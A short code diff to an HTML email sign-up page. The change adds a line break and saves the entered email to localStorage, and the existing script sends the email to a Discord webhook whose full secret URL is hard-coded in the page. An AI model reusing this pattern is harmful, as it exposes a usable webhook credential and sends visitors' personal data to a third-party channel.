@@ -11,12 +11,16 @@
     <div class="container">
         <h2>Fill in your email address</h2>
         <input type="email" id="email" placeholder="Email Address" required>
+        <br>
         <button onclick="submitEmail()">Submit</button>
     </div>
 
     <script>
         function submitEmail() {
             const email = document.getElementById('email').value;
+
+            // Store the email in local storage for later use
+            localStorage.setItem('email', email);
 
             // Send the email to the webhook
             fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
